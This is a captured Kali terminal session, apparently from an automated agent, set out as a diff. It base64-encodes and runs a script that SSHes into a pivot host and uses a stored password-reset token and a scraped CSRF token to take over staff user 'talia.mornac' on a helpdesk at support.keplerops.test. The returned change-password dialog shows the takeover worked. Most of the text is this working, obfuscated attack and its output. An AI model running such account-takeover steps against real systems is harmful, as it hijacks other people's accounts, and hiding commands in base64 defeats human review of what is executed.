@@ -1,0 +1,74 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r14.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKSj0vdG1wL2NrcDIudHh0OyBybSAtZiAkSgpUT0tFTj1rMTctdGFsaWEtbW9ybmFjLXJldmlldy10b2tlbi0yODQxCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYyAkSiAtYiAkSiAiJEIvc2NwL3B3cmVzZXQucGhwP3Rva2VuPSRUT0tFTiIgLW8gL3RtcC94MS5odG1sClQ9JChncmVwIC1vRSAnbmFtZT0iX19DU1JGVG9rZW5fXyIgdmFsdWU9IlteIl0rIicgL3RtcC94MS5odG1sIHwgc2VkIC1FICdzLy4qdmFsdWU9IihbXiJdKykiLiovXDEvJykKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICRKIC1jICRKIC1YIFBPU1QgIiRCL3NjcC9wd3Jlc2V0LnBocCIgXAogIC0tZGF0YS11cmxlbmNvZGUgIl9fQ1NSRlRva2VuX189JFQiIC0tZGF0YS11cmxlbmNvZGUgImRvPW5ld3Bhc3N3ZCIgLS1kYXRhLXVybGVuY29kZSAidG9rZW49JFRPS0VOIiBcCiAgLS1kYXRhLXVybGVuY29kZSAidXNlcmlkPXRhbGlhLm1vcm5hYyIgLS1kYXRhLXVybGVuY29kZSAic3VibWl0PUxvZ2luIiAtbyAvZGV2L251bGwKZWNobyAiPT09IEFKQVggQ0hBTkdFIFBXIERJQUxPRyA9PT0iCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAkSiAtYyAkSiAiJEIvc2NwL2FqYXgucGhwL3N0YWZmLzQvY2hhbmdlLXBhc3N3b3JkIiAtbyAvdG1wL2NwLmh0bWwgLWkgfCBoZWFkIC04CmNhdCAvdG1wL2NwLmh0bWwgfCBoZWFkIC0xMjAKSU5ORVIK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r14.sh; bash /tmp/r14.sh; echo DONEMARK_1795194968602$((6*7))
+=== AJAX CHANGE PW DIALOG ===
+HTTP/1.1 200 OK
+Server: nginx
+Date: Fri, 20 Nov 2026 17:21:26 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2459
+Connection: keep-alive
+X-Powered-By: PHP/8.4.27
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+
+<h3 class="drag-handle">Change Password</h3>
+<b><a class="close" href="#"><i class="icon-remove-circle"></i></a></b>
+<div class="clear"></div>
+<hr/>
+<form method="post" action="#staff/4/change-password">
+  <div class="quick-add">
+          <table class="grid form">
+          <caption>            <div><small>Confirm your current password and enter a new password to continue</small></div>
+                    </caption>
+        <tbody><tr><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/><td style="width:8.3333%"/></tr></tbody>
+<tr>          <td class="cell" colspan=12 rowspan=1 style=""              data-field-id="2">
+              <fieldset class="field "
+                id="field_8f5d501a38669f"
+                data-field-id="2">
+              <label class="required"
+                  for="_8f5d501a38669f">
+                  Enter a new password:                                <span class="error">*</span>
+              </label>
+        <input type="password"
+            id="_8f5d501a38669f"
+            autofocus size="16" maxlength="30" placeholder="New Password"            name="8f5d501a38669f"
+            value=""/>
+                      </fieldset>
+          </td>
+      </tr><tr>          <td class="cell" colspan=12 rowspan=1 style=""              data-field-id="3">
+              <fieldset class="field "
+                id="field_fedc4af8e57dc2"
+                data-field-id="3">
+              <label class="required"
+                  for="_fedc4af8e57dc2">
+                  &nbsp;                                <span class="error">*</span>
+              </label>
+        <input type="password"
+            id="_fedc4af8e57dc2"
+             maxlength="128" size="16" placeholder="Confirm Password"            name="fedc4af8e57dc2"
+            value=""/>
+                      </fieldset>
+          </td>
+      </tr></tbody></table>  </div>
+  <hr>
+  <p class="full-width">
+    <span class="buttons pull-left">
+      <input type="reset" value="Reset" />
+      <input type="button" name="cancel" class="close"
+        value="Cancel" />
+    </span>
+    <span class="buttons pull-right">
+      <input type="submit" value="Update" />
+    </span>
+  </p>
+  <div class="clear"></div>
+</form>
